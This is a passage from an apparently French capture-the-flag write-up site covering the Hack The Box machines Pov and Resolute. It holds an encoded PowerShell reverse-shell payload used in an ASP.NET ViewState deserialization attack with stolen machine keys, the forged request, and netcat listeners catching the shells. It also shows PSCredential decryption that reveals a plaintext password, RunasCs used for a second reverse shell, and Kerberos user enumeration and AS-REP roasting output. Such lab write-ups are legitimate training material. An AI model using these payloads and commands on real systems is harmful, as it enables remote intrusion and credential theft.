JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA3ACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\" --path=\"/portfolio/default.aspx\" --apppath=\"/\" --decryptionalg=\"AES\" --decryptionkey=\"74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43\"  --validationalg=\"SHA1\" --validationkey=\"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468\"\n</code></pre> <p>Ce qui nous donne :</p> <pre><code>POST /portfolio/ HTTP/1.1\nHost: dev.pov.htb\nContent-Length: 3504\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://dev.pov.htb\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://dev.pov.htb/portfolio/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n__EVENTTARGET=download&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=1%2BPbl9s9bp9xkASfskocFFwT%2Bx2uLP5EJJnwgqYZyZ0Qv%2B%2BFItH7ey3HD%2Bte2Aic0T0MviUCGOpECysr52pRAxWNmPywQKj%2Br28HYedziAlBOkrXGYPDw975wZNGa3sgk%2BHvCvkQY3J16L%2BQiFUAbaDqYXsSA4ZZ%2BisGnoSNIqv8bp55YDUkjMyVRWqQBfxGPB5AVK2cfviBShraUWlfDsZZpL%2Bln1mouDLbL7qYYBWGkvZw9BWH4IXq4dSQENxlGK4qLI0wNJ9Xx8kPTNsUF1CD54zap%2BllySs5RJYNMQd1YW041Za84oM2r06YpVEcHpa%2FuQl1NIcan6pz3lSzMH%2BbPP0fiaPg2qgs0cGiMSfBtM%2F0AIdJedPJyz3LDQgyEppiZCZz1ebTQuTKiH7RtCudcbbqkQr89gk9fGU3j%2B%2FLugD6RWiE5I8UfywfuYZDl9qELv3aCKEGOw72E9%2FsbCFNh5p2Z2vl8J6trziazjZIfQQMYakOuceLhVY70XIBJblDgcJZBrw5Xuql0iLMTzj80Ba9W529WmZXis28Br%2F6sLonUSr4GBszwsKBtCOmzf2N67ExfyXrR%2Bmc5mpyiYNkDeFdR3MrcjXb0QP2J5ipMMZK4X8zzXNvxIBDjVJvi9taXP%2BzFBQ%2FX4L0OoKYFAGlBHOb4f5U%2BQtCmTgOR%2Bd4KbZhZPvgOQuTXCy%2FiTM0QoQiXDJSkDhuUHnAbyxSNWYB0PzvbPbnYjDjn43pWA63AVcdYFk0f35WUnWkZvzd6i1YJd79WHWOZKct7ZU%2BPOmgZemv6PRwOs%2Bo5NCcvjyZ8rUgg4z9HCBRnlATatMDrjIfyIbMwB5gAZNQnCzTOsJjlY20uJcQrsIUUz1CaTYgLqk6sPrAq0AaHifUVn9IaD81NjFLFlkEUAM%2FxXbKA7G%2BO%2F0M9%2F5o2jPgDvpnMLlCZa3ndvwAQMl9NbL%2FxRGZHOJH8QKDzcuRX3zXm23QOBEjJSh5RSTTsUbnVwSJej37w2sGFXZkDQEDxHVFUHX5b9k9OfgB9a4Xo%2BKG%2FNmOdotbzhPqlHgenu5KFWv3tpwx2dQhU0VFhOkpgUudL5H%2FPjwTe%2FApEYtT07HmGftHBplCETZ1yOtpSX0u9zQu70M%2FZfveVOzzZyIV%2Fxu0aJ%2BrRkPfgGBzTfEgDBIV2hqFvSHOmvvEKHExNsFCJmrzesVb%2FH5ZjoNXBBazaODslfeOt768rn10D77ZpEhEO%2BiozmUBWdq2JEmqDieqpmJyQFHIiNpAsfVsMEccegUjBPctUYmqeeZxGEeUym3HsycgvHpph3rtWsu9f3ZqKaS8ZiEvC%2Bg2gpKoOFPKdfyv4S4duriT6W%2F1SbhSIK7qpnwRf0NUZj4XR%2F80zMs1zVWvjlbRY%2F8O2X8ZkfFyhbuxhdnX8GLKp2ZdCu7X16Q10DAdE1t8npOApDO1Dmbv3LFkU3EgBZVPTKQkHHdo4kZd8OdkWYXQQ%2B3lyNEsHGGONjyZxQEytTiMJhWmNmQKuCY6GuNjqcNBQGnYg%2FHr6J9O98asmkUW42G7ZQN%2BNCiaCI3lztNx9bPZM0zmXdryVt54otYGYs4heWvc9rGQ2Vfze0o3oZx9lXTH8eNt8MYltaktHELhvnwmvW%2FwhrbpvgDLrJ36EJDcVXOz1Z4daoThuAfQX2ajCM7u2ymtCekAgBMhSOlvSivJ8CQBC8wrz88Au1OaTdfZKoontyLa5nwAXCdWYhWsMH2MXbUnPHEu5cs63Gt1uoLGv5MjXZVM3uAGQHhdki3s7KvRdgIQl2NFVRX%2FO5lEWUdQRozUXLHzqvTFuL2oRsgaFxaapE3%2ByVWbWPhnCcL0aEsMKGqroof7K1RwdZwglxmGuBAM95AIOyM9sJdTSYXdvp4SlkCac8CqgUAGw%2Bf1ji%2FJgs7r1nunvLSli2smOjytIGG5%2BxuEeAYppwB2FADP2U1UHmqF3sTPYJeenxX4G6O%2FUiPdThJDCEX0KIe0JDJLkITD5siuDSqga8BVPYQTbSKfSs9205dR5lCYAxJYoDfRLEs11A04OyhHHhPPJLOJxRtD8m1kZAzWpgxuALhB7gz2E%2BteE%2F3IAJuHgilGFOHSetdYKNbfUZf4G2VXPLBMWo0Y0ugD4h7aumBv%2FgBpFClgRzKBTqxjh%2FA%2BARv2pSANWe42jb%2B8fOXsrnHlAumkVEyOWVe3mQ0gRPoAx7ak7gFDK2dbU7qChvteISumQfoGCOaA5jxD02tXI%2FV4cDVqUTZzKypOkBMF6LKsqP2nVX9Heeet9XI8OPmLiodDaEfQzcLDMhBXsKWT4wfbT4T%2Bn0swAZcbePzTj22XZdxGkEWe56r00EsuDF7wmBP5uHPISIyPjXTsHoUUI3H1Yx1R7hWtguv2rmIVKSmZYgk4e6HpCiAF2sh9OlA96LO0NKFSGai5dej8UzR43h1rN5eGIE4nU9RIYkLbne9B8MWlX0ejotApHerSt1coNiInSZqoHAl2WXypxNAgguu6U7XEmVij5umBjJ7QKYtsgr6wxDfbXeLCxirgzW1ZRlvrf6Cr6zpDgtIkOYXTVSG1%2BM0197j6wPqzGqCxQ6JI4Cqjq9E2EM4M%2FnvtQiF1rNZTRhaOXebaOnXe2CjoJKdDaI%2BmxBOCliVqAPf%2Bvrv9ywz7nuMVfdHg3cde3MgBb2MOG5u7AdOm5uDe83aaSbDb6yIBUR%2BSkHCVj81eqUaVTe%2Fwhu7p8KcoHJpq8apvCDIIzRuupjdQt3BG%2FQC6XG4PkGHFkPDIGYRC%2Fu8bD4gxygy1487sc08nDV%2FyyhEr0FQ3Hyurxnmg1rLuCmwYSAeh9gp4tOAJEQWJIpP38lg6S4XbrDOjA6GkUjHD%2BKEk2nlfAqksZN70eW3kF399EPLTbssv2vv6LmfJ7eXzW2vTXYhCSPWi9PDond8hQda0yGU%2BQs%2FsjHQ4yCPnEEwokBp6FVJ5Kd7aOSxPviKQffzRLbP0m93EBv3xxXx4WXeqzByW53dSTEHX8QkC9HvfmJLl7FXVVuUpV9JjsXtLKo5IUXF%2FzsEjvVwER%2BHs2969lgQQ7TZdGSFOUxYHVuRfzSydiw%3D%3D&amp;__VIEWSTATEGENERATOR=8E0F0FA3&amp;__EVENTVALIDATION=xN4J%2BRqc7RjO%2B6DYMdmQNNDEgW%2BSOBDBxJ8EOv5lnZNXpLq1GZ0JN64wjzyQBFoOX2P2kvacbe2wut%2BUD3MCqWdIPwR5SNj6vH5SMqgj6kvWWaTT8Usz%2BEAoIRycUBA2ZfzxEg%3D%3D&amp;file=/web.config\n</code></pre> <p>Et le reverse shell est re\u00e7u :</p> <pre><code>pak@laptop:~$ nc -lnvp 8001\nlistening on [any] 8001 ...\nconnect to [10.10.16.17] from (UNKNOWN) [10.129.39.248] 49674\ndir\n\n\n    Directory: C:\\windows\\system32\\inetsrv\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----        1/10/2024   6:44 AM                Config\nd-----       10/26/2023   4:30 PM                en\nd-----       10/26/2023   4:30 PM                en-US\n-a----       10/26/2023   2:48 PM         119808 appcmd.exe\n-a----        9/15/2018  12:14 AM           3810 appcmd.xml\n-a----       10/26/2023   4:30 PM         181760 AppHostNavigators.dll\n-a----       10/26/2023   4:30 PM          80896 apphostsvc.dll\n-a----       10/26/2023   2:48 PM         406016 appobj.dll\n-a----       10/26/2023   4:29 PM         131072 aspnetca.exe\n-a----       10/26/2023   2:53 PM          39936 authanon.dll\n-a----       10/26/2023   2:53 PM          38400 authbas.dll\n-a----       10/26/2023   2:48 PM          24064 cachfile.dll\n-a----       10/26/2023   4:30 PM          53248 cachhttp.dll\n-a----       10/26/2023   2:53 PM          16896 cachtokn.dll\n-a----       10/26/2023   2:48 PM          14336 cachuri.dll\n-a----       10/26/2023   4:30 PM          54784 compstat.dll\n-a----       10/26/2023   4:30 PM          47104 custerr.dll\n-a----       10/26/2023   4:29 PM          20480 defdoc.dll\n-a----       10/26/2023   4:29 PM          24064 dirlist.dll\n-a----       10/26/2023   4:31 PM          68096 filter.dll\n-a----       10/26/2023   4:30 PM          38400 gzip.dll\n-a----       10/26/2023   4:29 PM          22016 httpmib.dll\n-a----       10/26/2023   2:48 PM          18432 hwebcore.dll\n-a----       10/26/2023   2:48 PM          63105 iis.msc\n-a----       10/26/2023   2:53 PM         307200 iiscore.dll\n-a----       10/26/2023   4:29 PM         110080 iisreg.dll\n-a----       10/26/2023   2:48 PM         231936 iisres.dll\n-a----       10/26/2023   4:29 PM          38400 iisrstas.exe\n-a----       10/26/2023   2:48 PM         192512 iissetup.exe\n-a----       10/26/2023   2:48 PM          57344 iissyspr.dll\n-a----       10/26/2023   4:29 PM          14848 iisual.exe\n-a----       10/26/2023   2:52 PM         285696 iisutil.dll\n-a----       10/26/2023   4:30 PM         614912 iisw3adm.dll\n-a----       10/26/2023   2:52 PM         125440 InetMgr.exe\n-a----       10/26/2023   2:53 PM         131072 isapi.dll\n-a----       10/26/2023   4:30 PM          36352 loghttp.dll\n-a----       10/26/2023   4:30 PM         147456 Microsoft.Web.Administration.dll\n-a----       10/26/2023   4:30 PM        1052672 Microsoft.Web.Management.dll\n-a----       10/26/2023   4:29 PM          44032 modrqflt.dll\n-a----       10/26/2023   2:52 PM         478720 nativerd.dll\n-a----       10/26/2023   4:30 PM          27136 protsup.dll\n-a----        1/11/2024   6:51 AM          21504 redirect.dll\n-a----       10/26/2023   2:48 PM          33792 rsca.dll\n-a----       10/26/2023   2:48 PM          51200 rscaext.dll\n-a----       10/26/2023   4:29 PM          40448 static.dll\n-a----       10/26/2023   4:29 PM         189952 uihelper.dll\n-a----       10/26/2023   4:31 PM          21504 validcfg.dll\n-a----       10/26/2023   2:48 PM          16384 w3ctrlps.dll\n-a----       10/26/2023   4:29 PM          29696 w3ctrs.dll\n-a----       10/26/2023   2:48 PM         109568 w3dt.dll\n-a----       10/26/2023   4:30 PM         101888 w3logsvc.dll\n-a----       10/26/2023   4:30 PM          29184 w3tp.dll\n-a----       10/26/2023   4:30 PM          26624 w3wp.exe\n-a----       10/26/2023   4:30 PM          78336 w3wphost.dll\n-a----       10/26/2023   4:30 PM          31744 wbhstipm.dll\n-a----       10/26/2023   4:30 PM          27648 wbhst_pm.dll\n-a----       10/26/2023   4:30 PM         169984 XPath.dll\n\n\nPS C:\\windows\\system32\\inetsrv&gt;\n</code></pre> <pre><code>PS C:\\windows\\system32\\inetsrv&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name SID\n========= =============================================\npov\\sfitz S-1-5-21-2506154456-4081221362-271687478-1000\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                             Type             SID                                                           Attributes\n====================================== ================ ============================================================= ==================================================\nEveryone                               Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                          Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\BATCH                     Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group\nCONSOLE LOGON                          Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users       Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization         Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account             Well-known group S-1-5-113                                                     Mandatory group, Enabled by default, Enabled group\nBUILTIN\\IIS_IUSRS                      Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group\nLOCAL                                  Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group\nIIS APPPOOL\\dev                        Well-known group S-1-5-82-781516728-2844361489-696272565-2378874797-2530480757 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication       Well-known group S-1-5-64-10                                                   Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level Label            S-1-16-8192\n\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n</code></pre> <p>En cherchant dans le dossier de l'utilisateur je trouve un .xml contenant potentiellement des creds. L'utilisation d'import-clixml permet alors de d\u00e9chiffrer le mot de passe de l'utilisateur alaading :</p> <pre><code>PS C:\\Users\\sfitz&gt; dir Documents\n\n\n    Directory: C:\\Users\\sfitz\\Documents\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       12/25/2023   2:26 PM           1838 connection.xml\n\n\nPS C:\\Users\\sfitz&gt; type Documents\\connection.xml\n&lt;Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"&gt;\n  &lt;Obj RefId=\"0\"&gt;\n    &lt;TN RefId=\"0\"&gt;\n      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;\n      &lt;T&gt;System.Object&lt;/T&gt;\n    &lt;/TN&gt;\n    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;\n    &lt;Props&gt;\n      &lt;S N=\"UserName\"&gt;alaading&lt;/S&gt;\n      &lt;SS N=\"Password\"&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&lt;/SS&gt;\n    &lt;/Props&gt;\n  &lt;/Obj&gt;\n&lt;/Objs&gt;\nPS C:\\Users\\sfitz&gt; $cred = Import-CliXml -Path Documents\\connection.xml; $cred.GetNetworkCredential() | Format-List *\n\n\nUserName       : alaading\nPassword       : f8gQ8fynP44ek1m3\nSecurePassword : System.Security.SecureString\nDomain         :\n</code></pre> <p>Utilisation de runascs pour lancer un autre reverse-shell :</p> <pre><code>PS C:\\Users\\sfitz\\Downloads&gt; .\\runascs.exe alaading f8gQ8fynP44ek1m3 -r 10.10.16.17:4444\n[-] Not enough arguments. 3 Arguments required. Use --help for additional help.\nPS C:\\Users\\sfitz\\Downloads&gt; .\\runascs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.16.17:4444\n\n[+] Running in session 0 with process function CreateProcessWithLogonW()\n[+] Using Station\\Desktop: Service-0x0-27216e$\\Default\n[+] Async process 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' with pid 4456 created in background.\n</code></pre> <pre><code>pak@laptop:~$ nc -lnvp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.17] from (UNKNOWN) [10.129.39.248] 49678\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32&gt; whoami\nwhoami\npov\\alaading\nPS C:\\Windows\\system32&gt; whoami /all\nwhoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name    SID\n============ =============================================\npov\\alaading S-1-5-21-2506154456-4081221362-271687478-1001\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                           Type             SID          Attributes\n\n==================================== ================ ============ ==================================================\nEveryone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\INTERACTIVE             Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group\nCONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\High Mandatory Level Label            S-1-16-12288\n\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeDebugPrivilege              Debug programs                 Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n\nPS C:\\Windows\\system32&gt;\n</code></pre> <p>Le privil\u00e8ge SeDebug est actif, ce qui nous permet d'utiliser l'exploit habituel pour passer SYSTEM :) !</p>"},{"location":"Writeup/HTB/Machines/Resolute/","title":"Resolute","text":"Room Resolute Url https://app.hackthebox.com/machines/220 Sujets Windows/AD/ADCS Active/Retired lors de la r\u00e9solution Retired Difficult\u00e9 Medium"},{"location":"Writeup/HTB/Machines/Resolute/#nmap","title":"Nmap","text":"<pre><code>PORT      STATE SERVICE      REASON  VERSION\n53/tcp    open  domain       syn-ack Simple DNS Plus\n88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2024-03-18 22:51:36Z)\n135/tcp   open  msrpc        syn-ack Microsoft Windows RPC\n139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn\n389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)\n464/tcp   open  kpasswd5?    syn-ack\n593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped   syn-ack\n3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped   syn-ack\n5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf       syn-ack .NET Message Framing\n47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49665/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49666/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49667/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49671/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0\n49677/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49686/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49706/tcp open  msrpc        syn-ack Microsoft Windows RPC\n49750/tcp open  msrpc        syn-ack Microsoft Windows RPC\nService Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre> <p>Enum\u00e9ration des utilisateurs :</p> <pre><code>pak@DESKTOP-AF1CU53:~$ Downloads/kerbrute_linux_amd64 userenum --dc 10.129.167.19 -d megabank.local /usr/share/wordlists/secl\nists/Usernames/xato-net-10-million-usernames.txt\n\n    __             __               __\n   / /_____  _____/ /_  _______  __/ /____\n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/\n\nVersion: v1.0.3 (9dad6e1) - 03/18/24 - Ronnie Flathers @ropnop\n\n2024/03/18 23:49:16 &gt;  Using KDC(s):\n2024/03/18 23:49:16 &gt;   10.129.167.19:88\n\n2024/03/18 23:49:16 &gt;  [+] VALID USERNAME:       steve@megabank.local\n2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       fred@megabank.local\n2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       marcus@megabank.local\n2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       simon@megabank.local\n2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       ryan@megabank.local\n2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       stevie@megabank.local\n2024/03/18 23:49:18 &gt;  [+] VALID USERNAME:       angela@megabank.local\n2024/03/18 23:49:19 &gt;  [+] VALID USERNAME:       Steve@megabank.local\n2024/03/18 23:49:20 &gt;  [+] VALID USERNAME:       claire@megabank.local\n2024/03/18 23:49:21 &gt;  [+] VALID USERNAME:       sally@megabank.local\n2024/03/18 23:49:22 &gt;  [+] VALID USERNAME:       claude@megabank.local\n2024/03/18 23:49:24 &gt;  [+] VALID USERNAME:       melanie@megabank.local\n2024/03/18 23:49:25 &gt;  [+] VALID USERNAME:       administrator@megabank.local\n2024/03/18 23:49:26 &gt;  [+] VALID USERNAME:       gustavo@megabank.local\n2024/03/18 23:49:27 &gt;  [+] VALID USERNAME:       STEVE@megabank.local\n2024/03/18 23:49:28 &gt;  [+] VALID USERNAME:       marko@megabank.local\n2024/03/18 23:49:29 &gt;  [+] VALID USERNAME:       Marcus@megabank.local\n2024/03/18 23:49:33 &gt;  [+] VALID USERNAME:       Angela@megabank.local\n2024/03/18 23:49:35 &gt;  [+] VALID USERNAME:       Ryan@megabank.local\n2024/03/18 23:49:35 &gt;  [+] VALID USERNAME:       Fred@megabank.local\n2024/03/18 23:49:36 &gt;  [+] VALID USERNAME:       paulo@megabank.local\n2024/03/18 23:49:38 &gt;  [+] VALID USERNAME:       felicia@megabank.local\n2024/03/18 23:49:39 &gt;  [+] VALID USERNAME:       annette@megabank.local\n2024/03/18 23:49:39 &gt;  [+] VALID USERNAME:       abigail@megabank.local\n2024/03/18 23:49:42 &gt;  [+] VALID USERNAME:       Stevie@megabank.local\n2024/03/18 23:49:42 &gt;  [+] VALID USERNAME:       FRED@megabank.local\n2024/03/18 23:49:44 &gt;  [+] VALID USERNAME:       Simon@megabank.local\n2024/03/18 23:49:53 &gt;  [+] VALID USERNAME:       Annette@megabank.local\n2024/03/18 23:50:05 &gt;  [+] VALID USERNAME:       annika@megabank.local\n2024/03/18 23:50:06 &gt;  [+] VALID USERNAME:       Claude@megabank.local\n2024/03/18 23:50:19 &gt;  [+] VALID USERNAME:       per@megabank.local\n2024/03/18 23:50:23 &gt;  [+] VALID USERNAME:       Administrator@megabank.local\n2024/03/18 23:50:35 &gt;  [+] VALID USERNAME:       Sally@megabank.local\n2024/03/18 23:50:36 &gt;  [+] VALID USERNAME:       MARCUS@megabank.local\n2024/03/18 23:50:45 &gt;  [+] VALID USERNAME:       Claire@megabank.local\n2024/03/18 23:50:45 &gt;  [+] VALID USERNAME:       ANGELA@megabank.local\n2024/03/18 23:50:48 &gt;  [+] VALID USERNAME:       naoki@megabank.local\n2024/03/18 23:50:55 &gt;  [+] VALID USERNAME:       Melanie@megabank.local\n2024/03/18 23:50:55 &gt;  [+] VALID USERNAME:       Marko@megabank.local\n2024/03/18 23:51:07 &gt;  [+] VALID USERNAME:       SIMON@megabank.local\n2024/03/18 23:51:09 &gt;  [+] VALID USERNAME:       zach@megabank.local\n2024/03/18 23:51:44 &gt;  [+] VALID USERNAME:       Paulo@megabank.local\n2024/03/18 23:51:45 &gt;  [+] VALID USERNAME:       CLAUDE@megabank.local\n2024/03/18 23:52:11 &gt;  [+] VALID USERNAME:       Felicia@megabank.local\n2024/03/18 23:52:15 &gt;  [+] VALID USERNAME:       ulf@megabank.local\n2024/03/18 23:52:44 &gt;  [+] VALID USERNAME:       RYAN@megabank.local\n2024/03/18 23:53:39 &gt;  [+] VALID USERNAME:       MELANIE@megabank.local\n2024/03/18 23:53:40 &gt;  [+] VALID USERNAME:       Gustavo@megabank.local\n2024/03/18 23:54:01 &gt;  [+] VALID USERNAME:       resolute@megabank.local\n2024/03/18 23:55:08 &gt;  [+] VALID USERNAME:       ANNETTE@megabank.local\n2024/03/18 23:57:11 &gt;  [+] VALID USERNAME:       STEVIE@megabank.local\n2024/03/18 23:57:13 &gt;  [+] VALID USERNAME:       PAULO@megabank.local\n2024/03/18 23:57:15 &gt;  [+] VALID USERNAME:       MARKO@megabank.local\n2024/03/18 23:57:18 &gt;  [+] VALID USERNAME:       GUSTAVO@megabank.local\n2024/03/18 23:57:21 &gt;  [+] VALID USERNAME:       CLAIRE@megabank.local\n2024/03/18 23:57:23 &gt;  [+] VALID USERNAME:       Annika@megabank.local\n2024/03/19 00:03:22 &gt;  [+] VALID USERNAME:       Ulf@megabank.local\n</code></pre> <p>J'ai ensuite tent\u00e9 de voir si certains des utilisateurs n'\u00e9taient pas asreproastables :</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ impacket-GetNPUsers -dc-ip 10.129.167.19 -usersfile users.txt megabank.local/\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[-] User steve doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User fred doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User marcus doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User simon doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User stevie doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User angela doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User claire doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User claude doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User melanie doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User gustavo doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User marko doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User felicia doesn't have 